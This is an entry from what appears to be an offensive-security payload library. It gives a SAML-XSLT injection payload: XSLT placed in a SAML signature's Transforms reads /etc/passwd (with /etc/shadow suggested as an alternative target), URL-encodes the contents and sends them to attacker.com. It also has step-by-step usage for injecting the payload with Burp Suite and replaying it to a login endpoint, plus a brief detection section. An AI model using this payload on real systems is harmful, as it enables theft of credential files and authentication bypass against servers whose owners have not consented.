---
id: d967eb78-2800-46a2-a451-b49bcb8373a7
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:32.269037+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - xslt
  - exfiltration
  - saml
validated: true
---

# SAML-XSLT-Exfiltration-Payload

## Code

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## Description

This XML snippet embeds a malicious XSLT stylesheet within a SAML digital signature's transforms section. When processed by a vulnerable SAML parser, it reads the /etc/passwd file, URL-encodes its contents, appends to an attacker URL, and fetches from that URL (exfiltrating data via out-of-band request). Used in SAML injection to bypass auth and steal sensitive files from the application server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| attackerUrl | Attacker-controlled URL base for exfiltration | 'http://attacker.com/steal' |
| /etc/passwd | Target file path (change for other files like config) | '/etc/shadow' |

## Usage

Insert this snippet into the <ds:Transforms> of a captured SAML response XML using a proxy like Burp Suite. Re-base64 encode and replay to the ACS endpoint. Requires the app to process XSLT in signatures (vulnerable to T1220). Test locally with [[commands/xsltproc-apply-stylesheet]] before injection.

## Detection

- XML logs showing <xsl:stylesheet> or unparsed-text functions in SAML responses.
- Outbound HTTP requests from app server to unknown domains with encoded payloads.
- Parser errors or unusual file access (e.g., via auditd on Linux) during SAML processing.
- WAF alerts on XML injection patterns in POST bodies.

## Related

- [[procedures/SAML-Injection-Authentication-Bypass]]
- [[Burp-Suite]]
